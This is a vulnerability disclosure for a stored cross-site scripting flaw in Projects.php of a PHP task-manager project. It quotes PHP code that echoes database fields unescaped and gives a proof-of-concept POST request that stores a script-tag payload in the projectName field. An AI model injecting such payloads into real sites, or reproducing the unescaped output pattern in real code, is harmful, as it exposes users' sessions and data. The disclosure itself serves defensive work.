# task-manager-in-php has Cross Site Scripting vulnerability in Projects.php

## supplier 
https://code-projects.org/task-manager-in-php-with-source-code/
## Vulnerability file
Projects.php

## describe
In Projects.php, there are unrestricted cross site scripting attacks and injection attacks in the task-manager-in-php-with-source-code. The controllable parameters are as follows: $row['projectName'] parameter. This function will execute the user parameter without restriction into the echo statement. Malicious attackers can exploit this vulnerability to obtain sensitive information from clients

**Code analysis**    

Querying data from the database and storing it in the projectName, and the echo $row['projectName'] is not filtered, resulting in the execution of XSS statements.

code in Projects.php from line48-line87

```
<center> Your current tasks 
<table height = "50" border = "1" class="task">
<tr> <th>Project Name</th> <th>Task Name</th> <th>Start Date</th> <th>Due Date</th> <th>Priority</th> <th>Done</th> <th>Delete</th><th> Edit </th><th> Show Notes </th> </tr>
	<?php
		$sql = "SELECT tasks.*,project.projectName FROM tasks,project WHERE project.projectID = tasks.projectID";
		$result = $conn ->query($sql);
		while($row = $result ->fetch_assoc())
		{
			$colour = "";
			$date = strtotime($row['taskDueDate']);
			$date = date('Y/m/d',$date);
			$current_date = date("Y/m/d");
			if($row['taskDone'] == "no"){
				if(isset($row['taskDueDate']))
				{ 
					if ($current_date > $date){
						$colour = "#ff6060";
					}
				}
			}
			
			if($row['taskDone']== "yes"){
				if(isset($row['taskDueDate'])){
					if($current_date <= $date){
						$colour = "#60ff6e";
					}
				}
			}
			
			echo "<tr style = 'background-color :", $colour,"'><td>",$row['projectName'], '</td><td>', $row['taskName'], '</td><td>', $row['taskStartDate'], '</td><td>', $row['taskDueDate'], '</td><td>', $row['taskPriority'], '</td>',"
			<td><a class = 'table1' href='Task.php?done=1&taskID=",$row["taskID"],"'>&#10004</a></td>
			<td><a class = 'table1' href='Task.php?delete=1&taskID=",$row["taskID"],"'>&#10006</a></td>
			<td><a class = 'table1' href='EditTask.php?edit=1&taskID=",$row["taskID"],"'>Edit</a></td>
			<td> <button id='notesButton-",$row['taskID'],"' onClick =\"showNotes('",$row['taskID'],"')\"'>Show Notes </button> </td>
			</tr>
			<tr class='notes'>
			<td colspan=\"8\" style='display:none;' id='notes-",$row['taskID'],"'><hr>",$row['notes'],"<hr></td>
			</tr>";	
		}
	?>
```
the echo in line 48 is not filtered



## POC

```
POST /newProject.php HTTP/1.1
Host: localhost:8081
Content-Length: 86
Cache-Control: max-age=0
sec-ch-ua: "Chromium";v="131", "Not_A Brand";v="24"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "Windows"
Accept-Language: zh-CN,zh;q=0.9
Origin: http://localhost:8081
Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.6778.86 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: http://localhost:8081/Projects.php
Accept-Encoding: gzip, deflate, br
Connection: keep-alive

projectName=<script>alert(1)</script>&priority=Medium&createProject=%E6%8F%90%E4%BA%A4
```

Visit this URL to trigger the cross-site scripting vulnerability.

```
http://localhost:8081/Projects.php
```



**Result**

![image-20241126221600209](https://github.com/LamentXU123/cve/blob/main/assest/xss2.png)
